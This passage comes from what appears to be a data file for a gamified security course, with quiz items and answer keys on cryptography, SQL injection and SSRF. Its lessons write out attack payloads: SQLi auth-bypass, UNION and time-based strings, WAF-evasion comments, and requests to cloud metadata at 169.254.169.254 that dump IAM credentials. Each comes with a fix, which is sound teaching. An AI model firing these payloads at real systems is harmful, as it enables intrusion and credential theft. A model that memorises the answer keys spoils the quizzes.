        subtitle: 'Shared secret bulk encryption vs public/private key pairs',
        moduleId: 'mod_crypto',
        status: 'available',
        domain: 'Cryptography',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Cifratura Simmetrica vs Asimmetrica',
          keyTakeaway: 'AES è simmetrico (stessa chiave per cifrare e decifrare, velocissimo). RSA/ECC è asimmetrico (chiave pubblica e privata).',
          syntaxExample: 'Bulk Data: AES-256-GCM (Authenticated Encryption)\nKey Exchange: ECDH (Elliptic Curve Diffie-Hellman)',
          operationalContext: 'TLS usa la crittografia asimmetrica per scambiare in modo sicuro una chiave di sessione simmetrica (cifratura ibrida).'
        },
        questions: [
          {
            id: 'q_cry_hybrid',
            title: 'Role of Asymmetric Cryptography in TLS',
            type: 'multiple_choice',
            domain: 'Cryptography',
            difficulty: 'Intermediate',
            prompt: 'In TLS connections, why is asymmetric encryption used only during the initial handshake?',
            options: [
              { id: 'hy_1', text: 'Asymmetric encryption is too computationally slow for high-volume data streams', isCorrect: true },
              { id: 'hy_2', text: 'Symmetric keys cannot be transmitted over public internet connections', isCorrect: false },
              { id: 'hy_3', text: 'Asymmetric algorithms lack integrity verification against bit flips', isCorrect: false },
              { id: 'hy_4', text: 'Web browsers support symmetric encryption only on localhost', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Hybrid Encryption Architecture in TLS 1.3',
              whyItWorks: 'RSA/ECC establishes the shared secret; AES-GCM performs hardware-accelerated bulk data encryption.',
              patchRecommendation: 'Enforce AES-128-GCM or AES-256-GCM cipher suites with forward secrecy (ECDHE).',
              terminalProof: 'TLS Session: Protocol TLSv1.3, Cipher TLS_AES_256_GCM_SHA384'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_cry_5',
        title: 'X.509 Certificates & Public Key Infrastructure',
        subtitle: 'Certificate Authorities, trust chains, CRLs, and OCSP Stapling',
        moduleId: 'mod_crypto',
        status: 'available',
        domain: 'Cryptography',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Certificati X.509 e Catena di Fiducia PKI',
          keyTakeaway: 'Un certificato lega una chiave pubblica a un\'identità, firmato da una Root CA fidata. OCSP verifica la revoca in tempo reale.',
          syntaxExample: '$ openssl x509 -in cert.crt -text -noout\nIssuer: C=US, O=Let\'s Encrypt, CN=R3\nSubject: CN=zeroday.gg',
          operationalContext: 'Se un certificato intermedio scade o viene compromesso, tutti i domini dipendenti emettono avvisi di sicurezza nel browser.'
        },
        questions: [
          {
            id: 'q_cry_pki',
            title: 'Verify Certificate Revocation Status',
            type: 'multiple_choice',
            domain: 'Cryptography',
            difficulty: 'Intermediate',
            prompt: 'Which protocol allows web servers to bundle fresh cryptographic proof of certificate validity directly in the TLS handshake?',
            options: [
              { id: 'pk_1', text: 'OCSP Stapling (Online Certificate Status Protocol)', isCorrect: true },
              { id: 'pk_2', text: 'CRL Download (Certificate Revocation List)', isCorrect: false },
              { id: 'pk_3', text: 'DNSSEC (Domain Name System Security Extensions)', isCorrect: false },
              { id: 'pk_4', text: 'BGP Anycast (Border Gateway Protocol)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'RFC 6066: Certificate Status Request (OCSP Stapling)',
              whyItWorks: 'The web server queries the CA periodically and staples the signed OCSP response, saving client roundtrips.',
              patchRecommendation: 'Enable ssl_stapling on nginx/apache to boost TLS handshake speed and privacy.',
              terminalProof: '$ openssl s_client -connect target.com:443 -status\nOCSP Response Status: successful (0x0)'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_cry_6',
        title: 'Final Test: Applied Cryptography Exam',
        subtitle: 'Comprehensive evaluation on ciphers, key derivation, PKI and hashing',
        moduleId: 'mod_crypto',
        status: 'available',
        domain: 'Cryptography',
        xpReward: 120,
        eloReward: 35,
        isFinalTest: true,
        lessonExplanation: {
          conceptTitle: 'Esame Finale della Missione Crittografia',
          keyTakeaway: 'Valutazione pratica su selezione degli algoritmi, cifratura autenticata AES-GCM e protezione delle password aziendali.',
          syntaxExample: '$ openssl dgst -sha256 -verify pubkey.pem -signature sig.bin data.txt',
          operationalContext: 'Questo esame convalida le conoscenze di sicurezza crittografica richieste per superare CompTIA Security+ e CEH.'
        },
        questions: [
          {
            id: 'q_cry_exam_1',
            title: 'Authenticated Encryption Mode (AEAD)',
            type: 'multiple_choice',
            domain: 'Cryptography',
            difficulty: 'Hardcore',
            prompt: 'Why is AES in GCM (Galois/Counter Mode) preferred over AES in CBC mode for modern network communications?',
            options: [
              { id: 'ce_1', text: 'GCM provides built-in integrity authentication (AEAD) preventing padding oracle attacks', isCorrect: true },
              { id: 'ce_2', text: 'CBC mode requires public/private key pairs instead of shared symmetric secrets', isCorrect: false },
              { id: 'ce_3', text: 'GCM mode compresses payloads by 50% before performing mathematical transposition', isCorrect: false },
              { id: 'ce_4', text: 'CBC mode is restricted by export regulations outside North America', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Authenticated Encryption with Associated Data (AEAD)',
              whyItWorks: 'GCM produces an authentication tag alongside ciphertext, defeating chosen-ciphertext bit-flipping attacks.',
              patchRecommendation: 'Deprecate AES-CBC and 3DES; standardize on AES-GCM or ChaCha20-Poly1305.',
              terminalProof: 'Cipher: TLS_AES_256_GCM_SHA384 (Authenticated Tag Verified)'
            },
            xpReward: 60,
            eloReward: 17
          },
          {
            id: 'q_cry_exam_2',
            title: 'Identify Recommended KDF for Credentials',
            type: 'multiple_choice',
            domain: 'Cryptography',
            difficulty: 'Intermediate',
            prompt: 'Which password hashing function won the Password Hashing Competition (PHC) and is recommended for new enterprise systems?',
            options: [
              { id: 'ce_kdf1', text: 'Argon2id (Memory-hard key derivation function)', isCorrect: true },
              { id: 'ce_kdf2', text: 'MD5 with 1000 rounds of concatenation', isCorrect: false },
              { id: 'ce_kdf3', text: 'Single-round SHA-256 with timestamp salt', isCorrect: false },
              { id: 'ce_kdf4', text: 'DES (Data Encryption Standard) password cipher', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'RFC 9106: Argon2 Password Hashing Function',
              whyItWorks: 'Argon2id provides memory-hardness that makes GPU/ASIC cracking economically prohibitive.',
              patchRecommendation: 'Use Argon2id with 64MB memory cost and 3 iterations for user logins.',
              terminalProof: '$ argon2 "$argon2id$v=19$m=65536,t=3,p=4$..." (Verified)'
            },
            xpReward: 60,
            eloReward: 18
          }
        ]
      }
    ]
  },

  // =========================================================================
  // MISSION 4: SQL INJECTION (Web Sec Core)
  // =========================================================================
  {
    id: 'mod_web_sqli',
    title: 'SQL INJECTION',
    certificationFocus: 'OWASP Top 10 A03:2021 & CompTIA PenTest+',
    color: '#F43F5E',
    nodes: [
      {
        id: 'node_sqli_1',
        title: 'SQL Injection Anatomy & Concatenation',
        subtitle: 'How unsanitized user input alters backend database queries',
        moduleId: 'mod_web_sqli',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Concatenazione di Stringhe e Iniezione SQL',
          keyTakeaway: 'Se l\'input utente viene concatenato direttamente nella query SQL, i metacaratteri (come la virgoletta singola \') alterano la logica SQL.',
          syntaxExample: 'SELECT * FROM users WHERE user = \'' + 'attacker\'' + ' AND pass = \'...\'',
          operationalContext: 'L\'iniezione SQL si verifica ogni volta che i dati dell\'utente vengono trattati dall\'interprete come codice eseguibile.'
        },
        questions: [
          {
            id: 'q_sqli_anatomy',
            title: 'Identify Vulnerable SQL Concatenation',
            type: 'multiple_choice',
            domain: 'Web Sec',
            difficulty: 'Beginner',
            prompt: 'Which code pattern introduces SQL Injection by concatenating untrusted parameters into the query string?',
            options: [
              { id: 'sq_1', text: '"SELECT * FROM users WHERE name = \'" + userInput + "\'"', isCorrect: true },
              { id: 'sq_2', text: 'db.query("SELECT * FROM users WHERE name = ?", [userInput])', isCorrect: false },
              { id: 'sq_3', text: 'UserRepository.findByName(userInput)', isCorrect: false },
              { id: 'sq_4', text: 'db.prepare("SELECT * FROM users WHERE id = :id").bind(userInput)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
              whyItWorks: 'Direct string concatenation allows user input to break out of data context and execute arbitrary SQL clauses.',
              patchRecommendation: 'Always use parameterized queries (prepared statements) without string concatenation.',
              terminalProof: '$ curl "http://target.corp/api?name=admin%27--"'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_sqli_2',
        title: 'Authentication Bypass with \' OR 1=1',
        subtitle: 'Forcing tautologies and commenting out password verifications',
        moduleId: 'mod_web_sqli',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Bypass di Autenticazione con Tautologie',
          keyTakeaway: 'Il payload "\' OR 1=1 --" trasforma la clausola WHERE in una condizione sempre vera, restituendo il primo record (spesso l\'admin).',
          syntaxExample: 'WHERE username = \'admin\' OR 1=1 -- \' AND password = \'...\'',
          operationalContext: 'I caratteri di commento (-- in SQL Server/Postgres, # in MySQL) troncano la verifica della password successiva.'
        },
        questions: [
          {
            id: 'q_sqli_tautology',
            title: 'Spot the Bug: Authentication Bypass Payload',
            type: 'spot_the_zeroday',
            domain: 'Web Sec',
            difficulty: 'Beginner',
            prompt: 'An attacker tests a vulnerable login portal. TAP THE LINE where unparameterized string concatenation allows auth bypass:',
            codeLines: [
              { lineNum: 1, code: 'function login(req, res) {' },
              { lineNum: 2, code: '  const { user, pass } = req.body;' },
              { lineNum: 3, code: '  const sql = `SELECT * FROM users WHERE user = "${user}" AND pass = "${pass}"`;', isVulnerable: true, vulnerabilityHint: 'Literal template string concatenation allows an attacker to input: admin" OR 1=1 --' },
              { lineNum: 4, code: '  db.execute(sql, (err, rows) => { res.json(rows[0]); });' }
            ],
            options: [
              { id: 'st_sql1', text: 'Line 3: template literal concatenation in sql string', isCorrect: true },
              { id: 'st_sql2', text: 'Line 2: destructuring user and pass from body', isCorrect: false },
              { id: 'st_sql3', text: 'Line 4: callback function returning json response', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'OWASP Top 10 A03: SQL Injection Authentication Bypass',
              whyItWorks: 'The query evaluates user="admin" OR 1=1, satisfying the WHERE check regardless of password.',
              patchRecommendation: 'Replace with: db.execute("SELECT * FROM users WHERE user = ? AND pass = ?", [user, pass]);',
              terminalProof: '$ curl -d "user=admin\" OR 1=1 --&pass=x" http://target/login\n{"status":"logged_in","role":"admin"}'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_sqli_3',
        title: 'UNION-Based Data Exfiltration',
        subtitle: 'Combining query results to dump database tables and schemas',
        moduleId: 'mod_web_sqli',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Estrazione Dati con Operatore UNION',
          keyTakeaway: 'UNION combina i risultati di due SELECT. Requisito fondamentale: entrambe le query devono avere lo stesso numero di colonne e tipi compatibili.',
          syntaxExample: '\' UNION SELECT null, username, password FROM users --',
          operationalContext: 'Attraverso information_schema.tables e columns l\'attaccante mappa l\'intera struttura del database prima del dump.'
        },
        questions: [
          {
            id: 'q_sqli_union',
            title: 'Identify Prerequisite for UNION Queries',
            type: 'multiple_choice',
            domain: 'Web Sec',
            difficulty: 'Intermediate',
            prompt: 'What mathematical condition must be satisfied between the original query and the injected UNION SELECT query?',
            options: [
              { id: 'un_1', text: 'Both queries must return the exact same number of columns with compatible data types', isCorrect: true },
              { id: 'un_2', text: 'The injected query must target the exact same table name as the original query', isCorrect: false },
              { id: 'un_3', text: 'The database user must hold SUPERADMIN or GRANT ALL PRIVILEGES permissions', isCorrect: false },
              { id: 'un_4', text: 'The query must be executed over an unencrypted HTTP cleartext connection', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'UNION-Based SQL Injection Mechanics',
              whyItWorks: 'SQL requires matching column counts and data types across unified result sets.',
              patchRecommendation: 'Use prepared statements; disable verbose database error messages in production.',
              terminalProof: '$ curl "http://target/search?q=\' UNION SELECT 1,username,password FROM users--"'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_sqli_4',
        title: 'Blind SQL Injection: Boolean & Time-Based',
        subtitle: 'Inferring data byte-by-byte via conditional responses and sleep delays',
        moduleId: 'mod_web_sqli',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Blind SQLi: Estrazione Incondizionata',
          keyTakeaway: 'Quando l\'applicazione non mostra output a schermo, si estraggono dati ponendo domande vero/falso (Boolean) o misurando il tempo di risposta (pg_sleep, SLEEP).',
          syntaxExample: '\' AND (SELECT IF(version() LIKE \'8%\', SLEEP(5), 0)) --',
          operationalContext: 'Gli strumenti automatici come sqlmap inviano centinaia di richieste temporizzate per ricostruire le password carattere per carattere.'
        },
        questions: [
          {
            id: 'q_sqli_blind',
            title: 'Detect Time-Based Blind Injection Payload',
            type: 'multiple_choice',
            domain: 'Web Sec',
            difficulty: 'Intermediate',
            prompt: 'Which payload tests for PostgreSQL time-based blind SQL injection by delaying server response by 5 seconds?',
            options: [
              { id: 'tb_1', text: '\' OR (SELECT 1 FROM pg_sleep(5)) --', isCorrect: true },
              { id: 'tb_2', text: '\' OR WAITFOR DELAY \'0:0:5\' -- (MSSQL syntax)', isCorrect: false },
              { id: 'tb_3', text: '\' OR SLEEP(5) -- (MySQL syntax)', isCorrect: false },
              { id: 'tb_4', text: '\' AND 1=1 -- (Boolean blind check)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CWE-89: Time-Based Blind SQL Injection (PostgreSQL)',
              whyItWorks: 'pg_sleep halts backend process execution; if the response takes 5+ seconds, the injection is verified.',
              patchRecommendation: 'Enforce parameterized queries; rate-limit API endpoints with anomalous response latencies.',
              terminalProof: '$ time curl "http://target/api?id=1%27%20OR%20pg_sleep(5)--"\nreal 0m5.021s'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_sqli_5',
        title: 'Prepared Statements & Remediation',
        subtitle: 'Separating SQL code from data at the database parser level',
        moduleId: 'mod_web_sqli',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Prepared Statements: La Difesa Infallibile',
          keyTakeaway: 'I Prepared Statements inviano la query pre-compilata con placeholder (? o :param). I parametri utente vengono trattati come dati letterali, mai come codice.',
          syntaxExample: 'const stmt = db.prepare("SELECT * FROM users WHERE email = ?");\nstmt.all(userEmail);',
          operationalContext: 'L\'escaping delle stringhe (addslashes) è inefficace se la codifica dei caratteri varia; solo i prepared statements garantiscono immunità totale.'
        },
        questions: [
          {
            id: 'q_sqli_defense',
            title: 'Identify Correct Remediation Pattern',
            type: 'multiple_choice',
            domain: 'Web Sec',
            difficulty: 'Beginner',
            prompt: 'Why are parameterized prepared statements completely immune to SQL Injection?',
            options: [
              { id: 'df_1', text: 'Database compiles query structure before binding user input as strict data literals', isCorrect: true },
              { id: 'df_2', text: 'They automatically strip quotes and special characters from HTTP requests', isCorrect: false },
              { id: 'df_3', text: 'They encrypt all incoming form parameters using AES-256 before insertion', isCorrect: false },
              { id: 'df_4', text: 'They convert all incoming SQL queries into NoSQL MongoDB documents', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Defensive Software Architecture: Prepared Statements',
              whyItWorks: 'Separation of code and data prevents metacharacters from mutating query syntax.',
              patchRecommendation: 'Standardize on parameterized queries and use modern ORMs safely.',
              terminalProof: 'Query Plan Cached: SELECT * FROM users WHERE email = $1'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_sqli_6',
        title: 'Final Test: SQL Injection Assessment',
        subtitle: 'Comprehensive penetration testing exam on web vulnerability exploitation & patching',
        moduleId: 'mod_web_sqli',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 120,
        eloReward: 35,
        isFinalTest: true,
        lessonExplanation: {
          conceptTitle: 'Esame Finale della Missione SQL Injection',
          keyTakeaway: 'Dimostra la capacità di individuare vettori SQLi, estrarre informazioni sensibili e implementare rimedi sicuri.',
          syntaxExample: 'sqlmap -u "http://target.corp/profile.php?id=1" --batch --dbs',
          operationalContext: 'Questo esame finale certifica le competenze operative su OWASP Injection per CompTIA PenTest+ e CEH.'
        },
        questions: [
          {
            id: 'q_sqli_exam_1',
            title: 'Second-Order SQL Injection Mechanism',
            type: 'multiple_choice',
            domain: 'Web Sec',
            difficulty: 'Hardcore',
            prompt: 'How does a Second-Order (Stored) SQL Injection attack operate against a backend database?',
            options: [
              { id: 'se_1', text: 'Payload is stored safely initially, but executes later when processed in a secondary query', isCorrect: true },
              { id: 'se_2', text: 'Payload sends two concurrent HTTP requests simultaneously to cause a race condition', isCorrect: false },
              { id: 'se_3', text: 'Payload targets secondary backup databases while primary master remains unaffected', isCorrect: false },
              { id: 'se_4', text: 'Payload executes on the client-side browser via Document Object Model mutation', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CWE-89: Second-Order SQL Injection',
              whyItWorks: 'Developers assume database records are trusted and re-query them with unsafe concatenation.',
              patchRecommendation: 'Apply parameterized queries to ALL database reads, even when consuming existing database rows.',
              terminalProof: 'User register: admin\'--\nLater admin batch job executes: SELECT ... WHERE name = \'admin\'--\''
            },
            xpReward: 60,
            eloReward: 17
          },
          {
            id: 'q_sqli_exam_2',
            title: 'WAF Evasion via Comment Obfuscation',
            type: 'multiple_choice',
            domain: 'Web Sec',
            difficulty: 'Intermediate',
            prompt: 'Which technique is commonly used to evade simple Web Application Firewall (WAF) regex filters detecting "UNION SELECT"?',
            options: [
              { id: 'se_waf1', text: 'Inline comments such as /*!50000UNION*/ /*!50000SELECT*/ in MySQL', isCorrect: true },
              { id: 'se_waf2', text: 'Encrypting the query with AES-128 before sending HTTP POST body', isCorrect: false },
              { id: 'se_waf3', text: 'Changing the client user-agent header to Mozilla/5.0 Googlebot', isCorrect: false },
              { id: 'se_waf4', text: 'Sending the HTTP request over port 443 instead of port 80', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'WAF Signature Evasion: Comment Splitting',
              whyItWorks: 'MySQL parses inline version comments as valid tokens, while naive regex filters fail to match keywords.',
              patchRecommendation: 'Do not rely solely on WAF regexes; sanitize and parameterize at the application layer.',
              terminalProof: 'GET /item?id=1/*UNION*/SELECT password FROM users'
            },
            xpReward: 60,
            eloReward: 18
          }
        ]
      }
    ]
  },

  // =========================================================================
  // MISSION 5: SSRF & CLOUD METADATA (Cloud Security)
  // =========================================================================
  {
    id: 'mod_ssrf',
    title: 'SSRF & CLOUD METADATA',
    certificationFocus: 'AWS Certified Security & OWASP Top 10 A10:2021',
    color: '#F59E0B',
    nodes: [
      {
        id: 'node_ssrf_1',
        title: 'Server-Side Request Forgery Fundamentals',
        subtitle: 'Forcing the vulnerable server to dispatch requests to internal network assets',
        moduleId: 'mod_ssrf',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Anatomia di una Vulnerabilità SSRF',
          keyTakeaway: 'SSRF si verifica quando un server web accetta un URL dall\'utente e ne scarica il contenuto senza validare se punta a risorse interne protette (localhost, 127.0.0.1, 192.168.x.x).',
          syntaxExample: '$ curl "https://vulnerable.corp/fetch?url=http://127.0.0.1:8080/admin"',
          operationalContext: 'Il firewall perimetrale blocca le connessioni esterne alla rete interna, ma il web server risiede all\'interno della DMZ e può accedere alle risorse riservate.'
        },
        questions: [
          {
            id: 'q_ssrf_basics',
            title: 'Identify SSRF Vulnerable Feature',
            type: 'multiple_choice',
            domain: 'Web Sec',
            difficulty: 'Beginner',
            prompt: 'Which application feature is most commonly susceptible to Server-Side Request Forgery (SSRF)?',
            options: [
              { id: 'sf_1', text: 'Fetch user avatar or export PDF from a user-supplied external URL', isCorrect: true },
              { id: 'sf_2', text: 'Displaying database records paginated across multiple pages', isCorrect: false },
              { id: 'sf_3', text: 'Generating client-side cryptographic hashes with WebCrypto API', isCorrect: false },
              { id: 'sf_4', text: 'Uploading static CSS files to a local public web directory', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CWE-918: Server-Side Request Forgery (SSRF)',
              whyItWorks: 'The server-side HTTP client blindly requests whatever URL is passed in the request parameter.',
              patchRecommendation: 'Validate and whitelist allowed protocols and domain destinations before making outbound requests.',
              terminalProof: '$ curl "http://target/preview?url=http://localhost:3306"'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_ssrf_2',
        title: 'Cloud IMDSv1 169.254.169.254 Target',
        subtitle: 'Accessing link-local metadata to dump temporary IAM cloud credentials',
        moduleId: 'mod_ssrf',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Servizio di Metadata Cloud (IMDSv1)',
          keyTakeaway: 'L\'indirizzo link-local 169.254.169.254 è accessibile dalle istanze cloud per ottenere configurazioni di bootstrap e token IAM temporanei.',
          syntaxExample: '$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role',
          operationalContext: 'Con IMDSv1 una singola richiesta GET SSRF è sufficiente per esfiltrare AccessKeyId, SecretAccessKey e Token dell\'intero tenant cloud.'
        },
        questions: [
          {
            id: 'q_ssrf_imds',
            title: 'Spot the Bug: Cloud Metadata Target',
            type: 'spot_the_zeroday',
            domain: 'Web Sec',
            difficulty: 'Intermediate',
            prompt: 'An attacker tests a webhook tester endpoint. TAP THE LINE targeting cloud link-local metadata:',
            codeLines: [
              { lineNum: 1, code: 'const express = require("express");' },
              { lineNum: 2, code: 'app.post("/test-webhook", async (req, res) => {' },
              { lineNum: 3, code: '  const response = await axios.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/");', isVulnerable: true, vulnerabilityHint: '169.254.169.254 is the cloud link-local metadata endpoint: SSRF here dumps IAM credentials!' },
              { lineNum: 4, code: '  res.send(response.data);' }
            ],
            options: [
              { id: 'st_imds1', text: 'Line 3: requesting cloud link-local metadata 169.254.169.254', isCorrect: true },
              { id: 'st_imds2', text: 'Line 1: requiring express standard library', isCorrect: false },
              { id: 'st_imds3', text: 'Line 4: sending response data back to client', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Cloud Security: AWS/GCP IMDS Exploitation',
              whyItWorks: 'IMDSv1 allows unauthenticated GET requests from localhost to dump IAM session tokens.',
              patchRecommendation: 'Enforce IMDSv2 (requires session token PUT header) and block link-local traffic via local iptables.',
              terminalProof: '$ curl http://169.254.169.254/latest/meta-data/\nami-id\nhostname\niam/'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_ssrf_3',
        title: 'Bypassing IP Filters & DNS Rebinding',
        subtitle: 'Evading regex blacklists with decimal IPs, IPv6, and dynamic DNS',
        moduleId: 'mod_ssrf',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Evasione Filtri IP e DNS Rebinding',
          keyTakeaway: 'I filtri basati su blacklist (es. blocco di "127.0.0.1") vengono bypassati usando notazione decimale (2130706433), esadecimale (0x7f000001) o IPv6 (::1).',
          syntaxExample: 'http://2130706433:8080/ (equivale a 127.0.0.1)\nhttp://[::1]:8080/\nhttp://localtest.me/ (risolve a 127.0.0.1)',
          operationalContext: 'Il DNS Rebinding risponde inizialmente con un IP pubblico lecito per passare il controllo, e subito dopo con 127.0.0.1 per il fetch reale (TOCTOU).'
        },
        questions: [
          {
            id: 'q_ssrf_evasion',
            title: 'Identify Decimal Representation of Localhost',
            type: 'multiple_choice',
            domain: 'Web Sec',
            difficulty: 'Intermediate',
            prompt: 'Which integer value represents 127.0.0.1 in decimal format to bypass string blacklist filters?',
            options: [
              { id: 'ev_1', text: '2130706433 (Decimal 32-bit integer for 127.0.0.1)', isCorrect: true },
              { id: 'ev_2', text: '3232235521 (Decimal representation for 192.168.0.1)', isCorrect: false },
              { id: 'ev_3', text: '167772161 (Decimal representation for 10.0.0.1)', isCorrect: false },
              { id: 'ev_4', text: '2886729729 (Decimal representation for 172.16.0.1)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Blacklist Filter Bypass via Alternative IP Encodings',
              whyItWorks: 'Standard socket libraries parse 2130706433 as (127<<24)+(0<<16)+(0<<8)+1 = 127.0.0.1.',
              patchRecommendation: 'Resolve the hostname first to its canonical IP address and verify it against a private CIDR blocklist.',
              terminalProof: '$ ping 2130706433\nPING 2130706433 (127.0.0.1) 56(84) bytes of data'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_ssrf_4',
        title: 'IAM Credentials & Token Exfiltration',
        subtitle: 'Parsing STS session keys and pivoting into AWS S3 or GCP Storage',
        moduleId: 'mod_ssrf',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Esfiltrazione Token IAM e Pivot nel Cloud',
          keyTakeaway: 'Ottenute le chiavi AccessKeyId e SecretAccessKey tramite SSRF, l\'attaccante configura l\'AWS CLI per assumere il ruolo dell\'istanza e accedere ai bucket S3.',
          syntaxExample: '$ export AWS_ACCESS_KEY_ID="AKIA..."\n$ export AWS_SECRET_ACCESS_KEY="..."\n$ aws s3 ls',
          operationalContext: 'L\'incidente di Capital One (2019) sfruttò esattamente un SSRF su un WAF malconfigurato per esfiltrare le credenziali IAM e oltre 100M di record clienti.'
        },
        questions: [
          {
            id: 'q_ssrf_iam',
            title: 'Verify AWS CLI Credential Export',
            type: 'multiple_choice',
            domain: 'Web Sec',
            difficulty: 'Intermediate',
            prompt: 'Which AWS STS command verifies the identity and ARN of the currently active credentials extracted via SSRF?',
            options: [
              { id: 'am_1', text: 'aws sts get-caller-identity', isCorrect: true },
              { id: 'am_2', text: 'aws s3 list-buckets --all', isCorrect: false },
              { id: 'am_3', text: 'aws ec2 describe-instances --active', isCorrect: false },
              { id: 'am_4', text: 'aws iam reset-root-password', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Cloud Post-Exploitation: STS Caller Identity',
              whyItWorks: 'get-caller-identity returns Account ID, UserId, and ARN without modifying cloud state.',
              patchRecommendation: 'Implement least privilege on EC2 instance profiles; never grant AdministratorAccess to web servers.',
              terminalProof: '$ aws sts get-caller-identity\n{"Arn": "arn:aws:sts::123456789:assumed-role/EC2Role/i-0abcdef"}'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_ssrf_5',
        title: 'IMDSv2 Mitigation & Network Egress Rules',
        subtitle: 'Token-backed session requests (X-aws-ec2-metadata-token) and iptables hardening',
        moduleId: 'mod_ssrf',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Hardening con IMDSv2 e Policy Egress',
          keyTakeaway: 'IMDSv2 richiede un token di sessione ottenuto tramite una richiesta PUT con header custom (X-aws-ec2-metadata-token-ttl-seconds). La maggior parte degli SSRF non può forgiare header PUT.',
          syntaxExample: '# 1. Ottieni token di sessione:\nTOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`\n# 2. Richiedi metadata col token:\ncurl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/',
          operationalContext: 'Disabilitare IMDSv1 e richiedere "HttpTokens: required" nelle configurazioni di lancio EC2 neutralizza gli exploit SSRF basati su semplici richieste GET.'
        },
        questions: [
          {
            id: 'q_ssrf_imdsv2',
            title: 'Identify Primary Defense Mechanism of IMDSv2',
            type: 'multiple_choice',
            domain: 'Web Sec',
            difficulty: 'Intermediate',
            prompt: 'Why does IMDSv2 effectively prevent exploitation through classic GET-based SSRF vulnerabilities?',
            options: [
              { id: 'v2_1', text: 'Requires a prior HTTP PUT request with a custom header to obtain a session token', isCorrect: true },
              { id: 'v2_2', text: 'Encrypts the entire metadata payload using an asymmetric RSA-4096 keypair', isCorrect: false },
              { id: 'v2_3', text: 'Restricts metadata access exclusively to requests arriving over public IPv6', isCorrect: false },
              { id: 'v2_4', text: 'Deletes all IAM instance profiles automatically whenever an HTTP request occurs', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'AWS IMDSv2 Defensive Architecture',
              whyItWorks: 'Simple SSRF vectors cannot execute custom HTTP PUT requests with custom header fields.',
              patchRecommendation: 'Enforce: aws ec2 modify-instance-metadata-options --http-tokens required --instance-id i-xxxx',
              terminalProof: '$ curl -X GET http://169.254.169.254/latest/meta-data/\nHTTP/1.1 401 Unauthorized'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_ssrf_6',
        title: 'Final Test: SSRF & Cloud Defense Exam',
        subtitle: 'Comprehensive evaluation on SSRF exploitation, metadata attacks, and cloud infrastructure defense',
        moduleId: 'mod_ssrf',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 120,
        eloReward: 35,
        isFinalTest: true,
        lessonExplanation: {
          conceptTitle: 'Esame Finale della Missione SSRF & Cloud',
          keyTakeaway: 'Dimostra la piena comprensione delle tecniche di pivot interno, dell\'interazione con i metadati cloud e delle contromisure IMDSv2.',
          syntaxExample: '$ iptables -A OUTPUT -d 169.254.169.254 -m owner ! --uid-owner root -j DROP',
